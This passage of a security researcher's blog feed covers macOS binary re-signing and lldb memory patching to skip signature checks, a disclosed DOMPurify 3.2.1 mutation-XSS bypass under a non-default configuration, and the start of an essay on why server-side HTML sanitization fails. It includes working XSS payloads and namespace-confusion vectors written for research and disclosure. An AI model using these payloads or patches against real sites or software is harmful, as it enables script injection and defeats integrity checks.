class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Now we need to create a certificate, which we can use to sign the file. </p><ol><li>Open Keychain Access application<img src="/img/blogs/macos-debugging/image6.png" style="display: block; margin-left: auto;  margin-right: auto; width: 15%;"/></li><li>And via the toolbar create a certificate with the type “Code Signing”:<img src="/img/blogs/macos-debugging/image7.png" style="width: 100%;"/><img src="/img/blogs/macos-debugging/image8.png" style="width: 100%;"/></li></ol><p>using the custom certificate we can now re-sign the executable using:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo codesign --entitlements &lt;path_to_entitlements.xml&gt; -fs lldb &lt;path_to_binary&gt;</span><br></pre></td></tr></table></figure><p><em>lldb</em> is the name given to the certificate in this example, of course, this can be whatever you’d like. And the <code>-fs</code> flag, forcefully signs the binary which ignores previous signatures.<br>To test if the signature was updated, simply run the first command discussed in this section. You should see the new entitlements (and the custom certificate as the authority).</p><h1 id="Bypassing-Signature-Check"><a href="#Bypassing-Signature-Check" class="headerlink" title="Bypassing Signature Check"></a>Bypassing Signature Check</h1><p>Sometimes, changing the signature can affect the binary’s execution flow if the implemented logic checks certain fields of the signature that have been tampered with. A common check is the <a href="https://developer.apple.com/documentation/automaticassessmentconfiguration/aeassessmentapplication/teamidentifier?language=objc">Team Identifier</a>, which is meant to identify the team that developed the application (This can be used for example, when an application needs to verify that a received <a href="https://developer.apple.com/documentation/xpc?language=objc">XPC</a> communication is made from a trustable source).</p><h2 id="Insufficient-Signature-Check"><a href="#Insufficient-Signature-Check" class="headerlink" title="Insufficient Signature Check"></a>Insufficient Signature Check</h2><p>If not performed correctly, such as in this <a href="https://wojciechregula.blog/post/learn-xpc-exploitation-part-1-broken-cryptography/">case</a> covered by <a href="https://x.com/_r3ggi">Wojciech Reguła</a>, you can simply change the “Organizational Unit” in the certificate by overriding the default parameters of the certificate<br><img src="/img/blogs/macos-debugging/image9.png" style="width: 100%;"/><br><img src="/img/blogs/macos-debugging/image10.png" style="width: 100%;"/></p><p>However, in one of my research, the application used the key <a href="https://developer.apple.com/documentation/security/kseccodeinfoteamidentifier?language=objc">kSecCodeInfoTeamIdentifier</a>, which checked the team identifier in a safe manner, and I couldn’t find a way to change it. In this case I had to seek different solutions, with the simplest ones being patching the binary to bypass the verifications.</p><p>We can automate a dynamic patch to the memory or change the file on the disk itself, which will avoid the check of the signature. Each patching approach, dynamic vs. static, has pros and cons. In the dynamic approach, we change the code in memory after the binary is already loaded, and depending on the situation, it could be simpler than a static patch as this method does not require us to resign the binary again.</p><h2 id="Dynamic-Patching"><a href="#Dynamic-Patching" class="headerlink" title="Dynamic Patching"></a>Dynamic Patching</h2><p>For demonstration purposes, let’s say we would like to patch a function named <code>is_dev</code>, that hard-codedly returns 0. But in cases when it returns 1, the signature verification is skipped (finding what exactly is needed to be changed is binary-dependent, and can be discovered by static reverse engineering).<br>The function disassembled code looks as such:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span> mov w0,#<span class="number">0</span>x0</span><br><span class="line"><span class="attribute">c0</span> <span class="number">03</span> <span class="number">5</span>f d6 ret </span><br></pre></td></tr></table></figure><p>We can use an <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=movz+w0,+%231%0D%0Aret&arch=arm64&as_format=inline#assembly">online disassembler</a> or change the value directly in ghidra to see the new function bytes, in this case, returning 1 will change the first null byte to <code>\x20</code>. Let’s look at two approaches to patching the function:</p><p>Using <code>lldb</code> CLI:</p><ul><li>Attach to the process</li><li>Find the function location in memory using <code>image lookup -n is_dev -v</code></li><li>Write to change the code using <code>mem write &lt;address&gt; &lt;value&gt;</code></li><li>Read to confirm the change - <code>mem read &lt;address&gt; (--count optional)</code></li></ul><p>Automate it using Python (<a href="https://lldb.llvm.org/use/python-reference.html#using-the-lldb-py-module-in-python">official docs</a>):</p><ul><li>Access scripting tool via the <code>script</code> command in <code>lldb</code>‘s CLI</li><li>Or if you’d like to import <code>lldb</code> directly into your Python environment<ul><li>Locate <code>lldb</code> python module using <code>lldb -P</code>, then according to the module use the corresponding python version (can see it in the file name <code>_lldb.cpython-&#123;version&#125;-darwin.so</code>, for example <code>_lldb.cpython-312-darwin.so</code> use python3.12)</li><li>In case you get <code>ImportError: cannot import name &#39;_lldb&#39; from partially initialized module &#39;lldb&#39; (most likely due to a circular import</code> or would like another version you can <code>brew install llvm</code> and get the new python module at <code>/opt/homebrew/opt/llvm/bin/lldb -P</code></li></ul></li><li>Here is a sample code:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys sys.path.append(<span class="string">&#x27;/Applications/Xcode.app/Contents/SharedFrameworks/LLDB.framework/Resources/Python3&#x27;</span>) </span><br><span class="line"><span class="keyword">import</span> lldb</span><br><span class="line"></span><br><span class="line">process_name = <span class="string">&quot;&lt;NAME&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">listener = lldb.SBListener()</span><br><span class="line">error = lldb.SBError()</span><br><span class="line">dbg = lldb.SBDebugger.Create()</span><br><span class="line">target = dbg.CreateTarget(<span class="literal">None</span>)</span><br><span class="line">process = target.AttachToProcessWithName(listener, process_name, <span class="literal">False</span>, error)</span><br><span class="line">function_name = <span class="string">&quot;is_dev&quot;</span></span><br><span class="line">function = target.FindFunctions(function_name)[<span class="number">0</span>]</span><br><span class="line">function_address = function.GetSymbol().GetStartAddress()</span><br><span class="line">process.WriteMemory(function_address.GetLoadAddress(target), <span class="string">&#x27;\x20&#x27;</span>, error)</span><br><span class="line"><span class="comment"># check that it worked - process.ReadMemory(function_address.GetLoadAddress(target)-1, 1, error)</span></span><br><span class="line">process.Continue()</span><br></pre></td></tr></table></figure></li></ul><h2 id="Static-Patching"><a href="#Static-Patching" class="headerlink" title="Static Patching"></a>Static Patching</h2><p>Static patching can be the solution in some scenarios where the binary that you need to patch runs on demand and does not stay running. This is a simpler solution, but can run into problems since we do need to re-sign the executable. </p><p>You can directly patch the binary via ghidra, just change the desired code and <code>file -&gt; export program</code>. After that, you’ll need to sign the file again as explained in previous sections. Again, if something doesn’t work, the console app is your friend.</p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this blog, I covered a beginner-friendly explanation on setting up the environment for dynamically debugging a complied application on MacOS. I discussed how to overcome some of Apple’s protections and provided simple tools to self-diagnose issues that will likely arise. Hopefully this will help you start smoothly when debugging binaries on MacOS.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/img/blogs/macos-debugging/image1.png&quot; style=&quot;display: block;  margin-left: auto;  margin-right: auto; width: 25%;&quot;/&gt;

&lt;h1 id=&quot;Int</summary>
      
    
    
    
    
    <category term="macos" scheme="https://yaniv-git.github.io/tags/macos/"/>
    
    <category term="lldb" scheme="https://yaniv-git.github.io/tags/lldb/"/>
    
    <category term="ghidra" scheme="https://yaniv-git.github.io/tags/ghidra/"/>
    
    <category term="debugging" scheme="https://yaniv-git.github.io/tags/debugging/"/>
    
  </entry>
  
  <entry>
    <title>DOMPurify 3.2.1 Bypass (Non-Default Config)</title>
    <link href="https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/"/>
    <id>https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/</id>
    <published>2024-12-08T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Over the years, we have seen DOMPurify bypasses using various techniques. A prominent one is namespace confusion, which usually takes advantage of <a href="https://yaniv-git.github.io/2024/05/26/mXSS:%20The%20Vulnerability%20Hiding%20in%20Your%20Code/#Parsing-round-trip">parsing roundtrip tricks</a> to change the namespace of certain elements. Up until the <a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">discovery</a> of Michał Bentkowski’s (<a href="https://x.com/securitymb">@SecurityMB</a>) <code>form</code> element mutation in 2020 (Which resulted in version 2.0.17 bypass using confusion of a direct descendant in MathML’s HTML integration point), there wasn’t any significant mitigation mechanism to tackle namespace confusion. A solution proposed by Michał was to verify if the element is in the correct namespace by checking the parent namespace. This was later <a href="https://github.com/cure53/DOMPurify/pull/495">implemented</a> and would go down as a bulletproof approach to prevent namespace confusion for years.</p><p>Up until earlier this year (2024), <a href="https://x.com/icesfont2">@IcesFont</a> discovered a new mXSS vector, this time exploiting the limitation of nested elements’ depth. This and <a href="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes">subsequent discoveries</a> on the topic led DOMPurify maintainers to implement various changes, such as disabling HTML integration in SVG namespace and adding additional regex validations, so that regardless of namespace confusions, there isn’t supposed to be a way to bypass the sanitizer.</p><p>But today, we will cover a different mutation that can cause namespace confusion despite having the parental check and without using nesting limitation techniques (credit to <a href="https://x.com/kinugawamasato">@kinugawamasato</a>, who discovered it independently and <a href="https://x.com/kinugawamasato/status/1843687909431582830">covered</a> it briefly on Twitter).</p><h1 id="Namespace-Confusion-Regardless-of-a-Parental-Check"><a href="#Namespace-Confusion-Regardless-of-a-Parental-Check" class="headerlink" title="Namespace Confusion, Regardless of a Parental Check"></a>Namespace Confusion, Regardless of a Parental Check</h1><p>This technique enables an element to jump an arbitrary amount of nested elements up using the following payload:</p><p><code>&lt;root&gt;&lt;foo-bar&gt;&#123;arbitrary element(s)&#125;&lt;p&gt;&#123;arbitrary HTML element(s)&#125;&lt;table&gt;&lt;foo-bar&gt;&lt;p&gt;&lt;/p&gt;&lt;/foo-bar&gt;&lt;payload&gt;</code></p><p>Parsing it will result in the following DOM tree:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  ├─ </span><span class="template-variable">&#123;arbitrary element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  ├─ </span><span class="template-variable">&#123;arbitrary HTML element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  │  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">payload</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>And on the second parsing iteration, the DOM will look as such:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  ├─ </span><span class="template-variable">&#123;arbitrary element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  ├─ </span><span class="template-variable">&#123;arbitrary HTML element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">payload</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Generally speaking what comes after the <code>p</code> element (which can also be other ones such as <code>dd</code>, <code>dt</code>, <code>li</code>) will escape to the level next to the initial <code>foo-bar</code>.<br>However, for this to cause namespace confusion, the <code>foo-bar</code> element must be in both a foreign namespace and HTML. Since DOMPurify doesn’t allow HTML integration in SVG anymore, we cannot use this in the SVG namespace (which would have been convenient because SVG shares some elements, such as <code>a</code>, with HTML by default). </p><p>Interestingly, if we allow custom elements in DOMPurify, it actually allows them in all namespaces:<br><img src="/img/blogs/dompurify/image1.png" style="width: 100%;"/></p><p>So we can use this to have various types of namespace confusions (note that the SVG ones are applicable to older versions where HTML integration ponits were allowed):</p><ul><li>From HTML into SVG or MathML:<ul><li><code>&lt;math&gt;&lt;foo-test&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;foo-test&gt;&lt;li&gt;&lt;/li&gt;&lt;/foo-test&gt;a&lt;a&gt;</code></li><li><code>&lt;svg&gt;&lt;a&gt;&lt;foreignObject&gt;&lt;p&gt;&lt;table&gt;&lt;a&gt;&lt;li&gt;&lt;/li&gt;&lt;/a&gt;&lt;a&gt;</code></li></ul></li><li>From SVG to MathML:<ul><li><code>&lt;math&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;mi&gt;&lt;li&gt;t&lt;/mi&gt;&lt;/li&gt;&lt;/mi&gt;&lt;/math&gt;&lt;a&gt;&lt;svg&gt;</code></li><li><code>&lt;math&gt;&lt;foo-test&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;foo-test&gt;&lt;li&gt;&lt;/li&gt;&lt;/foo-test&gt;a&lt;svg&gt;&lt;title&gt;&lt;/title&gt;&lt;/svg&gt;</code></li></ul></li><li>From MathML to SVG: <ul><li><code>&lt;svg&gt;&lt;a&gt;&lt;foreignObject&gt;&lt;p&gt;&lt;table&gt;&lt;a&gt;&lt;li&gt;&lt;/li&gt;&lt;/a&gt;&lt;math&gt;</code></li></ul></li><li>From SVG to HTML:<ul><li><code> &lt;svg&gt;&lt;a&gt;&lt;foreignObject&gt;&lt;li&gt;&lt;table&gt;&lt;a&gt;&lt;li&gt;&lt;/table&gt;&lt;/li&gt;&lt;/a&gt;&lt;/a&gt;&lt;title&gt;&lt;svg&gt;&lt;a alt=&quot;&lt;/title&gt;&lt;img&gt;&quot;&gt;</code></li></ul></li><li>From MathML to HTML:<ul><li><code>&lt;math&gt;&lt;foo-test&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;foo-test&gt;&lt;li&gt;&lt;/li&gt;&lt;/foo-test&gt;a&lt;/table&gt;&lt;/li&gt;&lt;/mi&gt;&lt;a&gt;</code></li></ul></li></ul><p>But as mentioned before, this is not enough to have a bypass. Some regex checks will delete <a href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1333">attributes</a>, <a href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1062-L1063">raw_data</a> elements, or <a href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1079">comments</a> if the content is considered dangerous.</p><h1 id="The-is-Attribute"><a href="#The-is-Attribute" class="headerlink" title="The is Attribute"></a>The <em><code>is</code></em> Attribute</h1><p>I was reading the <a href="https://jorianwoltjer.com/blog/p/hacking/mutation-xss">official solution write-up</a> for a small mXSS challenge created by <a href="https://twitter.com/J0R1AN">Jorian</a>, and they discussed an interesting topic, where the <a href="https://html.spec.whatwg.org/#attr-is"><code>is</code> attribute</a> cannot be <a href="https://sonarsource.github.io/mxss-cheatsheet/#is">deleted</a>. Which got me wondering how DOMPurify handles such behavior. When looking at the code, the library was already aware of this and had <a href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L845">implemented mitigation</a>. But there was a small mistake <a href="https://github.com/cure53/DOMPurify/commit/79d57d6465c88101d512e06377b6e6babe8a11c2">introduced</a> in 2021. That caused the <code>forceRemove</code> function to be obsolete if the <code>is</code> attribute is in the <code>ALLOWED_ATTR</code> array, allowing arbitrary content in the <code>is</code> attribute if allowed in the configuration.</p><h1 id="The-Bypass"><a href="#The-Bypass" class="headerlink" title="The Bypass"></a>The Bypass</h1><p>All that is left to do is to combine those two topics</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">DOMPurify.sanitize(</span></span><br><span class="line"><span class="language-xml">&#x27;<span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-test</span>&gt;</span>a<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span>a<span class="tag">&lt;<span class="name">foo-bar</span> <span class="attr">is</span>=<span class="string">&quot;--&gt;&lt;img</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">src=x onerror=alert(1)&gt;&quot;</span>&gt;</span>&#x27;,</span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">        ADD_ATTR: [&#x27;is&#x27;],</span></span><br><span class="line"><span class="template-variable">        CUSTOM_ELEMENT_HANDLING: &#123;</span></span><br><span class="line"><span class="template-variable">        tagNameCheck: /^foo-/,</span></span><br><span class="line"><span class="template-variable">    &#125;</span><span class="language-xml">,</span></span><br><span class="line"><span class="language-xml">&#125;);</span></span><br><span class="line"><span class="language-xml">&gt;&gt;&gt; <span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span>a<span class="tag">&lt;<span class="name">foo-bar</span> <span class="attr">is</span>=<span class="string">&quot;--&gt;&lt;img src=x</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">onerror=alert(1)&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-bar</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span>a<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span></span><br></pre></td></tr></table></figure><img src="/img/blogs/dompurify/image2.png" style="width: 100%;"/><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this blog, we discussed the latest, config-dependent, DOMPurify bypass, from an interesting namespace confusion trick to the mishandling of the <code>is</code> attribute. I would like to give a special thanks to <a href="https://x.com/cure53berlin">@cure53berlin</a> for their incredible responsiveness, addressing the report quickly, and generally keeping up the support for this project.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h1&gt;&lt;p&gt;Over the years, we have seen DOMPurify</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="dompurify" scheme="https://yaniv-git.github.io/tags/dompurify/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
  </entry>
  
  <entry>
    <title>Sanitize Client-Side: Why Server-Side HTML Sanitization is Doomed to Fail</title>
    <link href="https://yaniv-git.github.io/2024/11/04/Sanitize%20Client-Side:%20Why%20Server-Side%20HTML%20Sanitization%20is%20Doomed%20to%20Fail/"/>
    <id>https://yaniv-git.github.io/2024/11/04/Sanitize%20Client-Side:%20Why%20Server-Side%20HTML%20Sanitization%20is%20Doomed%20to%20Fail/</id>
    <published>2024-11-04T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.241Z</updated>
    
    <content type="html"><![CDATA[<p>The battle against <a href="https://owasp.org/www-community/attacks/xss/">Cross-Site Scripting</a> (XSS) has been going on for years, with developers and security experts constantly seeking new and improved methods to protect web applications. The most common way is using a sanitizer, meant to manipulate untrusted user input in a smart way in order to prevent any unwanted markup. Implementing HTML sanitization on the server side sounds logical at first glance, but this strategy has often fallen short. In this blog, we will demonstrate the limitations of relying solely on server-side sanitization, and why this is one of the main root causes of bypasses.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="The-Problem"><a href="#The-Problem" class="headerlink" title="The Problem"></a>The Problem</h3><p>When a web application receives user-controlled input, such as comments or form submissions, it’s essential to ensure that this input is safe before displaying it to users. This prevents malicious code, like JavaScript, from being injected into the page and executed, leading to potential XSS vulnerabilities. One straightforward approach is to escape every character that has special meaning in HTML such as lower&#x2F;greater than signs (<code>&lt;</code>, <code>&gt;</code>), but more often than not web applications would actually like to support HTML input from the user to a certain extent, such as allowing titles, images, and bullet points.</p><p>To strike a balance between security and functionality, web applications often need to implement techniques that allow for certain HTML elements and attributes while still protecting against harmful content.</p><img src="/img/blogs/sanitize-client-side/image1.png" style="width: 100%;"/><h3 id="HTML-Sanitizers-as-a-solution"><a href="#HTML-Sanitizers-as-a-solution" class="headerlink" title="HTML Sanitizers as a solution"></a>HTML Sanitizers as a solution</h3><p>A sanitizer is meant to clean HTML input by removing or modifying potentially harmful elements and attributes. It helps prevent cross-site scripting (XSS) attacks by ensuring that only safe, trusted content is rendered on a web page. Sanitizers are often configurable, allowing developers to specify which elements and attributes are allowed. However, the more elements and attributes that are permitted, the larger the attack surface becomes, increasing the risk of XSS vulnerabilities.</p><h3 id="How-do-HTML-Sanitizers-work"><a href="#How-do-HTML-Sanitizers-work" class="headerlink" title="How do HTML Sanitizers work?"></a>How do HTML Sanitizers work?</h3><p>At first, the user’s input is just a string with no extensive meaning. So, how do the sanitizers know what to do with the data?</p><p>To simplify matters, the “magic” behind the scenes that enables sanitizers to manipulate the data in a smart way works usually by first parsing the untrusted HTML input to create a structured DOM tree object. This tree represents the hierarchical structure of the HTML elements and their attributes. Once the DOM tree is built, the sanitizer can iterate over it, examining each element and attribute. Based on its configuration, the sanitizer can then remove or modify elements and attributes that are considered unsafe or potentially harmful. This process helps ensure that only trusted content is rendered on the web page, preventing malicious code from being executed.</p><img src="/img/blogs/sanitize-client-side/image2.png" style="width: 100%;"/><h3 id="Which-client-side"><a href="#Which-client-side" class="headerlink" title="Which client side?"></a>Which client side?</h3><p>Let’s clarify a bit about the sentence “sanitize client side.” Considering a simplified XSS attack flow graph, there are generally three parties involved.</p><ul><li><p>Attacker: The one that generates the malicious input, whether it’s creating a link or posting a comment on a forum</p></li><li><p>Server: The node that serves the vulnerable page containing the malicious payload in it</p></li><li><p>Victim: The end user who views the page, and triggers the execution of the vulnerability</p></li></ul><img src="/img/blogs/sanitize-client-side/image3.png" style="width: 100%;"/><p>On the client side, there are two parties: an attacker and a victim. Of course, sanitizing on the attacker’s client side doesn’t make sense because any code running on their machine can easily be bypassed, meaning they don’t have to obey any local rules.</p><p>Other traditional vulnerabilities, such as SQL injection and Server Side Request Forgey (SSRF) are usually triggered on the server side, so it makes sense to sanitize the untrusted input where the vulnerability might take place. But XSS is triggered on the Victim’s machine (client-side), so as a best practice it should be sanitized there. We will provide a detailed explanation in the following section on the “why”.   </p><h2 id="Research-Story"><a href="#Research-Story" class="headerlink" title="Research Story"></a>Research Story</h2><p>Throughout our exploration of sanitizer bypasses, we consistently observed parsing issues on the server side. Yet, it wasn’t until we discovered a more widespread problem that we recognized the necessity of communicating the importance of client-side sanitization to developers.</p><p>It all began when one sanitizer bypass pattern caught our eyes:</p><ul><li><p><code>&lt;!--&gt;&lt;img src=x onerror=alert(1)&gt;--&gt;</code></p></li><li><p><code>&lt;textarea&gt;&lt;!--&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;--&gt;&lt;/textarea&gt;</code></p></li><li><p><code>&lt;math&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/style&gt;&lt;/math&gt;</code></p></li><li><p>And more…</p></li></ul><p>At first glance, the amount of payloads bypassing the sanitizer might seem like a generally poor logic implementation. However, a deeper analysis revealed <strong>one</strong> fundamental flaw.<br>Can you spot the core issue? If you do, you are probably an HTML expert at this point.</p><p>Despite the variety of bypasses, they all share a common root cause. Let’s try another guess, but this time with a hint: These bypasses affected not one sanitizer but <strong>most ones written in PHP</strong>.<br>Can you guess the root cause now?</p><p>Taking a step back and considering the common steps of <a href="#How-do-HTML-Sanitizers-work">how sanitizers work</a>, we noticed that the common denominator for vulnerable sanitizers is the parsing algorithm. In our case, most sanitizers we looked at written in PHP were using the built-in HTML parser. Given PHP’s primary use in web development, it offers an out-of-the-box HTML parser. Due to its convenience, it’s understandable why sanitizer developers opt-out to use it. However, if this parser’s behavior differs from the victim’s browser, it creates a discrepancy that attackers can exploit</p><p>So in what way was the PHP parser different from the browser that caused these bypasses? If we split the payloads by HTML features:</p><ul><li><p><code>&lt;!--</code> : Comment</p></li><li><p><code>&lt;textarea&gt;</code> : RCDATA</p></li><li><p><code>&lt;style&gt;</code> : RAWDATA</p></li><li><p><code>&lt;math&gt;</code> : Foreign content</p></li><li><p>…</p></li></ul><p>We notice that they are all either new or updated features in HTML version 5.</p><blockquote><p><em>HTML5 represents the most recent major revision of the HTML standard. Introduced in 2014 and used commonly by today’s standards, it hosted new features and capabilities, including multimedia support, new elements, different namespaces, web workers, and many more.</em></p></blockquote><p>The built-in PHP HTML parser was using the underlying package <a href="https://gitlab.gnome.org/GNOME/libxml2">libxml2</a>, which only claims to support HTML4. So, subsequently, PHP was parsing HTML with the outdated HTML 4 standard from before 2014.</p><h4 id="Differential-Example-Comments"><a href="#Differential-Example-Comments" class="headerlink" title="Differential Example: Comments"></a>Differential Example: Comments</h4><p>Let’s take a look at one example of a difference, comments. Pulling up HTML4 documentation, comments are simply starting with <code>&lt;!--</code> and ending with <code>--&gt;</code>. But in HTML5 it states that “the text must not start with the string <code>&gt;</code> nor <code>-&gt;</code>“ and can be ended with <code>--!&gt;</code> as well.</p><img src="/img/blogs/sanitize-client-side/image4.png" style="width: 100%;"/><p><strong>That means, most PHP sanitizers that allow comments (or any other specific HTML5 combination of tags) are vulnerable to bypasses.</strong></p><p>On one hand, it is convenient and most of the time best practice to delegate tasks using prewritten code. On the other hand, this also means that one bug might affect many applications:</p><img src="/img/blogs/sanitize-client-side/image5.png" style="width: 100%;"/><h2 id="Sanitizers’-Achilles’-heel-HTML-Parsing"><a href="#Sanitizers’-Achilles’-heel-HTML-Parsing" class="headerlink" title="Sanitizers’ Achilles’ heel: HTML Parsing"></a>Sanitizers’ Achilles’ heel: HTML Parsing</h2><p>It might seem like a big deal, potentially impacting many applications considering the wide spread of PHP. Unfortunately, this is just the tip of the iceberg. In fact, we encountered a third-party HTML5 parser written in PHP that included <a href="https://github.com/Masterminds/html5-php/issues/241">some differentials</a> which resulted in bypasses of sanitizer that used the library.</p><h3 id="The-Challenges-of-HTML-Parsing"><a href="#The-Challenges-of-HTML-Parsing" class="headerlink" title="The Challenges of HTML Parsing"></a>The Challenges of HTML Parsing</h3><p>With the evolution of the language and the introduction of features, the complication of HTML grew accordingly. Despite its widespread use, HTML is not always straightforward to parse. From backward compatibility to tolerance for errors, its flexibility can be a double-edged sword, leading to inconsistencies and unexpected behavior. The 